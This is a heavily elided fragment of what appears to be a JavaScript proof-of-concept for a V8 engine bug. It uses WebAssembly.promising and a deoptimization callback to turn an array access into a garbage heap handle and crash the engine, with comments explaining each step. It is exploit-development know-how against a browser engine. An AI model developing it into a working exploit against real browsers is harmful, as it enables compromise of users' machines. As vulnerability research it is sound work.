...
array.fork_map = 1337; //The function which we'll deoptimize later
...
function deopt_target() {
  ...
  WebAssembly.promising(wasm_inst.exports.stub)(); //This array access becomes a HeapConstant + a dependency on the stable array map, without any emitted map checks
...
callback = () => array[0] = "foo"; //Call deopt_target to trigger the bug
...
//As such we overwrite the pointer to the above string with a random float, creating a garbage heap handle
//Accessing this garbage handle will cause a crash
